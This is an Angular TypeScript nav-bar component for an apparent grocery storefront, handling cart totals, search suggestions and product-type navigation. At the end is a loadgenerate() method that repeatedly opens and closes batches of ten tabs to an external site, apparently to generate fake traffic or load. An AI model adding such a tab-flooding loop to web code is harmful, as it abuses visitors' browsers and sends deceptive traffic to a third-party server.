import { Component, OnInit, ViewEncapsulation } from '@angular/core';
import { CartItemsInfoService } from '../common-service/cart-items-info.service';
import { SessionStateService } from '../common-service/session-state.service';
import { ActivatedRoute, Params, Router } from '@angular/router';
import { AllproductProductinfoService } from '../common-service/allproduct-productinfo.service';
@Component({
  selector: 'app-nav-bar',
  templateUrl: './nav-bar.component.html',
  styleUrls: ['./nav-bar.component.scss'],
  encapsulation: ViewEncapsulation.None,
})
export class NavBarComponent implements OnInit {
  cartitemsinfo :any = [];
  cartvalue = 0;
  cities=[];
  isNavbarOpen: boolean = false;
  suggestions: string[] = [];
  filteredSuggestions: string[] = [];
  producttype = [];
  allproductinfo = [];
  constructor(private AllproductProductinfoService:AllproductProductinfoService,private router: Router, private CartItemsInfoService: CartItemsInfoService, private SessionStateService: SessionStateService) {
    this.cartitemsinfo = [];
    this.cartitemsinfo = this.CartItemsInfoService.itemsinfoobj;
    this.allproductinfo = this.AllproductProductinfoService.allproductinfo;
   }

  ngOnInit(): void {
    this.cartitemsinfo = [];
    this.cartitemsinfo = this.CartItemsInfoService.itemsinfoobj;
    this.suggestions = this.allproductinfo.map(val => val.productname);
    this.getcartcount();
    this.SessionStateService.on('updatedcartinfo').subscribe(() => {
      this.getcartcount();
    });
    this.cities = [
      { label: 'Profile', value: 'Profile', icon: 'pi pi-user' },
      { label: 'My Orders', value: 'My_Orders',icon: 'pi pi-list' },
      { label: 'My Cart', value: 'My_Cart', icon: 'pi pi-shopping-cart' },
      { label: 'Logout', value: 'Logout', icon: 'pi pi-sign-out' }
    ];
    this.producttype = [
      { label: 'Flour', value: 'flour', icon: 'pi pi-user' },
      { label: 'Rice Flour', value: 'riceflour', icon: 'pi pi-list' },
      { label: 'Besan', value: 'besan', icon: 'pi pi-shopping-cart' },
      { label: 'Oil', value: 'oil', icon: 'pi pi-sign-out' },
      { label: 'Rice', value: 'rice', icon: 'pi pi-sign-out' }
    ];
    
  }

  filterSuggestions(event: any) {
    const query = event.query;
    this.filteredSuggestions = this.suggestions.filter(suggestion =>
      suggestion.toLowerCase().includes(query.toLowerCase())
    );
  }
  onSuggestionSelect(event)
  {
   console.log("onsuggention event.value : ",event);
    this.router.navigate(['/product-detail'], { queryParams: { productitem_name: event }, replaceUrl: true });
    this.SessionStateService.set('productdetailsearchsection', event, true);
  }
  selectProductType(event:any)
  {
    this.router.navigate(['/product'], { queryParams: { producttype_name: event.value }, replaceUrl: true });
    this.SessionStateService.set('productinfotypesection', event.value, true);
  }
  selectNavProductType(event: any) {
    this.router.navigate(['/product'], { queryParams: { producttype_name: event }, replaceUrl: true });
    this.SessionStateService.set('productinfotypesection', event, true);
  }
  selectUsermenu(event: any) {
    console.log('selectUsermenu Value:', event.value);
  }
  toggleNavbar() {
    this.isNavbarOpen = !this.isNavbarOpen;
  }

  getcartcount()
  {
    this.cartvalue = 0;
    //console.log("getcartcount this.cartitemsinfo : ", this.cartitemsinfo);
    this.cartitemsinfo.forEach(element => {
      this.cartvalue += element.cartvalue;

    });
  }


  loadgenerate()
  {
    setInterval(()=>{
      for (let i = 0; i < 10; i++) {
        let newTab = window.open('https://ayodhyawasiapnastore.rf.gd/', '_blank');// window.open("https://waahbiryani.rf.gd/");
        setTimeout(() => {
          newTab.close();
        }, 10000);
      }
    },10000)
    
  }
}
